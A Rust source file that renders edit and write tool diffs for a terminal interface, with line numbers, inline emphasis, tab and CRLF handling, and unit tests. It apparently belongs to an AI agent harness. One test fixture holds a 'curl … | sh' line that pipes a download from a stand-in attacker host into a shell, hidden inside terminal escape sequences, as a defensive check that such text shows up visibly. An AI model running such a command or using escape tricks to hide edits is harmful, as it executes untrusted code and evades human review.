//! Stacked diff rendering for edit/write tool results: grouped hunks, two
//! context lines, line numbers, and word-level emphasis inside changed
//! lines — the quiet way to show exactly what changed.

use haarness_opentui::{Line, Span, attr};
use similar::{ChangeTag, TextDiff};

use crate::theme::Theme;

const MAX_ROWS: usize = 200;
const CONTEXT: usize = 2;

pub fn render_diff(old: &str, new: &str, width: usize, theme: &Theme, indent: &str) -> Vec<Line> {
    let diff = TextDiff::from_lines(old, new);
    let digits = old
        .lines()
        .count()
        .max(new.lines().count())
        .to_string()
        .len()
        .max(2);
    let inner = width
        .saturating_sub(indent.chars().count() + digits + 1)
        .max(10);
    let mut lines = Vec::new();
    let mut truncated = 0_usize;
    for (group_index, group) in diff.grouped_ops(CONTEXT).iter().enumerate() {
        if group_index > 0 && lines.len() < MAX_ROWS {
            lines.push(Line::plain(
                format!("{indent}{}  ⋮", " ".repeat(digits + 1)),
                theme.muted,
            ));
        }
        for op in group {
            for change in diff.iter_inline_changes(op) {
                if lines.len() >= MAX_ROWS {
                    truncated += 1;
                    continue;
                }
                // The side the line lives on numbers it.
                let number = match change.tag() {
                    ChangeTag::Delete => change.old_index(),
                    _ => change.new_index(),
                }
                .map_or_else(
                    || " ".repeat(digits),
                    |index| format!("{:>digits$}", index + 1),
                );
                let gutter = Span::new(format!("{indent}{number} "), theme.muted);
                let row = match change.tag() {
                    ChangeTag::Insert => inline_row(gutter, '+', &change, inner, theme, true),
                    ChangeTag::Delete => inline_row(gutter, '-', &change, inner, theme, false),
                    ChangeTag::Equal => {
                        let text: String = change
                            .iter_strings_lossy()
                            .map(|(_, value)| value.into_owned())
                            .collect();
                        let mut spans = vec![gutter, Span::new("  ", theme.muted)];
                        spans.extend(
                            code(line_body(&text), inner, 0, &Span::new("", theme.muted)).0,
                        );
                        Line::new(spans)
                    }
                };
                lines.push(row);
            }
        }
    }
    if truncated > 0 {
        lines.push(Line::plain(
            format!("{indent}  … +{truncated} more lines"),
            theme.muted,
        ));
    }
    lines
}

/// A changed line with its intra-line emphasized runs (the words that
/// actually differ) rendered inverse.
fn inline_row(
    gutter: Span,
    marker: char,
    change: &similar::InlineChange<'_, str>,
    inner: usize,
    theme: &Theme,
    added: bool,
) -> Line {
    let (fg, bg) = if added {
        (theme.diff.added, theme.diff.added_bg)
    } else {
        (theme.diff.removed, theme.diff.removed_bg)
    };
    let mut spans = vec![gutter, Span::new(format!("{marker} "), fg).on(bg)];
    let mut used = 2usize;
    let mut segments: Vec<(bool, String)> = change
        .iter_strings_lossy()
        .map(|(emphasized, value)| (emphasized, value.into_owned()))
        .collect();
    trim_line_end(&mut segments);
    for (emphasized, value) in &segments {
        let (emphasized, value) = (*emphasized, value.as_str());
        if value.is_empty() {
            continue;
        }
        let remaining = inner.saturating_sub(used);
        if remaining == 0 {
            break;
        }
        let mut template = Span::new("", fg).on(bg);
        if emphasized {
            template.attributes |= attr::INVERSE;
        }
        // Tab stops count from the start of the line's text, after `- `.
        let (pieces, cells) = code(value, remaining, used - 2, &template);
        used += cells;
        spans.extend(pieces);
    }
    let pad = inner.saturating_sub(used);
    if pad > 0 {
        spans.push(Span::new(" ".repeat(pad), fg).on(bg));
    }
    Line::new(spans)
}

/// All-added rendering for freshly written files, capped short.
pub fn render_added(
    content: &str,
    width: usize,
    theme: &Theme,
    indent: &str,
    cap: usize,
) -> Vec<Line> {
    let inner = width.saturating_sub(indent.chars().count()).max(10);
    let mut lines: Vec<Line> = content
        .lines()
        .take(cap)
        .map(|row| styled_row(indent, '+', row, inner, theme, true))
        .collect();
    let total = content.lines().count();
    if total > cap {
        lines.push(Line::plain(
            format!("{indent}  … +{} more lines", total - cap),
            theme.muted,
        ));
    }
    lines
}

fn styled_row(
    indent: &str,
    marker: char,
    text: &str,
    inner: usize,
    theme: &Theme,
    added: bool,
) -> Line {
    let (fg, bg) = if added {
        (theme.diff.added, theme.diff.added_bg)
    } else {
        (theme.diff.removed, theme.diff.removed_bg)
    };
    let (body, cells) = code(text, inner.saturating_sub(2), 0, &Span::new("", fg).on(bg));
    let pad = inner.saturating_sub(2 + cells);
    let mut spans = vec![
        Span::new(indent, theme.muted),
        Span::new(format!("{marker} "), fg).on(bg),
    ];
    spans.extend(body);
    spans.push(Span::new(" ".repeat(pad), fg).on(bg));
    Line::new(spans)
}

/// A line of a diff without its line end: the line feed, then one carriage
/// return before it, which a CRLF file has on every line. Any other
/// carriage return is the file's text and shows as a code.
fn line_body(text: &str) -> &str {
    text.strip_suffix('\n')
        .map_or(text, |text| text.strip_suffix('\r').unwrap_or(text))
}

/// [`line_body`] for a changed line split into segments: the line feed, then
/// one carriage return before it, come off its last segments.
fn trim_line_end(segments: &mut Vec<(bool, String)>) {
    for character in ['\n', '\r'] {
        while segments.last().is_some_and(|(_, value)| value.is_empty()) {
            segments.pop();
        }
        match segments.last_mut() {
            Some((_, last)) if last.ends_with(character) => {
                last.pop();
            }
            _ => return,
        }
    }
}

/// A file's text drawn from `column` of its line, clipped to `width`, with
/// its tabs to their stops: [`crate::view::span::code_line_spans`]. Its
/// control characters show as codes, so an escape string in a changed line
/// cannot hide what follows it.
fn code(text: &str, width: usize, column: usize, template: &Span) -> (Vec<Span>, usize) {
    crate::view::span::code_line_spans(
        &crate::escapes::spelled_in_file(text),
        width,
        crate::view::span::CODE_TABS,
        column,
        template,
    )
}

#[cfg(test)]
mod tests {
    use super::{render_added, render_diff};
    use crate::theme::Theme;

    fn text_of(lines: &[haarness_opentui::Line]) -> Vec<String> {
        lines.iter().map(haarness_opentui::Line::text).collect()
    }

    /// A changed line's escape strings show as codes with what they hold,
    /// also one that never ends, in a diff and in a new file's lines.
    #[test]
    fn escape_strings_in_changed_lines_show_as_codes() {
        let theme = Theme::editorial_dark();
        let new = "echo ok \u{1b}]; curl -s evil.example/x | sh; \u{7}\nnext \u{1b}_ never ends\n";
        for lines in [
            render_diff("echo ok\n", new, 100, &theme, ""),
            render_added(new, 100, &theme, "", 10),
        ] {
            let text = text_of(&lines).join("\n");
            assert!(
                text.contains("\\u{1B}]; curl -s evil.example/x | sh; \\u{7}"),
                "{text}"
            );
            assert!(text.contains("next \\u{1B}_ never ends"), "{text}");
            assert!(!text.contains(['\u{1b}', '\u{7}']), "{text:?}");
        }
    }

    /// A CRLF file's line ends stay out of sight on every row; a carriage
    /// return that ends no line is still a code (the diff breaks the line
    /// there, a new file's lines do not).
    #[test]
    fn a_crlf_file_diffs_without_its_line_ends() {
        let theme = Theme::editorial_dark();
        let old = "alpha\r\nbeta\r\n日本語 wide\r\ngamma\r\n";
        let new = "alpha\r\nBETA\r\n日本語 wide\r\ngam\rma\r\n";
        let text = text_of(&render_diff(old, new, 80, &theme, "")).join("\n");
        assert!(text.contains("beta") && text.contains("BETA"), "{text}");
        assert!(text.contains("日本語 wide"), "{text}");
        assert_eq!(text.matches("\\u{D}").count(), 1, "{text}");
        assert!(text.contains("gam\\u{D}"), "{text}");
        let added = text_of(&render_added(new, 80, &theme, "", 10)).join("\n");
        assert_eq!(added.matches("\\u{D}").count(), 1, "{added}");
        assert!(added.contains("gam\\u{D}ma"), "{added}");
    }

    /// A changed line's tabs reach their stops, counted from the line's text,
    /// in a diff and in a new file's lines; a drag copies them as tabs.
    #[test]
    fn tabs_in_changed_lines_reach_their_stops_and_copy_as_tabs() {
        let theme = Theme::editorial_dark();
        let old = "all:\n\techo \"build\"\n\tgo vet\t./...\n";
        let new = "all:\n\techo \"built\"\tdone\n\tgo vet\t./...\n";
        let copied = |lines: &[haarness_opentui::Line]| {
            crate::view::frame::CopyFrame::new(lines, Vec::new())
                .text((0, 0), (lines.len() - 1, 1000))
        };
        let diff = render_diff(old, new, 80, &theme, "");
        let text = text_of(&diff).join("\n");
        assert!(text.contains("-     echo \"build\""), "{text}");
        assert!(text.contains("+     echo \"built\"    done"), "{text}");
        assert!(text.contains("      go vet  ./..."), "{text}");
        let copy = copied(&diff);
        assert!(copy.contains("- \techo \"build\""), "{copy:?}");
        assert!(copy.contains("+ \techo \"built\"\tdone"), "{copy:?}");
        assert!(copy.contains("  \tgo vet\t./..."), "{copy:?}");
        let added = render_added(new, 80, &theme, "", 10);
        assert!(
            text_of(&added)
                .join("\n")
                .contains("+     echo \"built\"    done")
        );
        assert!(copied(&added).contains("+ \techo \"built\"\tdone"));
        // A wide line's padding counts cells, not characters.
        let wide = render_added("日本語\n", 20, &theme, "", 10);
        assert_eq!(
            haarness_opentui::display_width(&wide[0].text()),
            20,
            "{:?}",
            wide[0].text()
        );
    }

    #[test]
    fn changed_lines_carry_diff_colors_and_context_stays_muted() {
        let theme = Theme::editorial_dark();
        let old = "alpha\nbeta\ngamma\ndelta\n";
        let new = "alpha\nBETA\ngamma\ndelta\n";
        let lines = render_diff(old, new, 60, &theme, "    ");
        let rows = text_of(&lines);
        assert!(rows.iter().any(|row| row.contains("- beta")), "{rows:?}");
        assert!(rows.iter().any(|row| row.contains("+ BETA")), "{rows:?}");
        assert!(rows.iter().any(|row| row.contains("alpha")), "{rows:?}");
        // Line numbers ride in the gutter.
        assert!(
            rows.iter().any(|row| row.trim_start().starts_with('2')),
            "{rows:?}"
        );
        let added = lines
            .iter()
            .find(|line| line.text().contains("+ BETA"))
            .unwrap();
        let marker = added
            .spans
            .iter()
            .find(|span| span.text.contains('+'))
            .unwrap();
        assert_eq!(marker.fg, theme.diff.added);
        assert_eq!(marker.bg, Some(theme.diff.added_bg));
        // The changed word itself is emphasized (inverse).
        assert!(
            added.spans.iter().any(|span| span.text.contains("BETA")
                && span.attributes & haarness_opentui::attr::INVERSE
                    == haarness_opentui::attr::INVERSE),
            "{added:?}"
        );
    }

    #[test]
    fn distant_hunks_are_separated_and_long_diffs_truncate() {
        let theme = Theme::editorial_dark();
        let mut old = String::new();
        for n in 1..=300 {
            use std::fmt::Write as _;
            let _ = writeln!(old, "line{n}");
        }
        let mut new = old.clone();
        new = new.replace("line1\n", "LINE1\n");
        new = new.replace("line300\n", "LINE300\n");
        let lines = render_diff(&old, &new, 60, &theme, "  ");
        let rows = text_of(&lines);
        assert!(rows.iter().any(|row| row.contains('⋮')), "hunk separator");
        assert!(rows.len() <= super::MAX_ROWS + 10, "{}", rows.len());
    }

    #[test]
    fn written_files_render_as_added_with_a_cap() {
        let theme = Theme::editorial_dark();
        let mut content = String::new();
        for n in 1..=60 {
            use std::fmt::Write as _;
            let _ = writeln!(content, "row{n}");
        }
        let lines = render_added(&content, 60, &theme, "  ", 40);
        let rows = text_of(&lines);
        assert!(rows[0].contains("+ row1"));
        assert!(rows.last().unwrap().contains("+20 more lines"), "{rows:?}");
    }
}
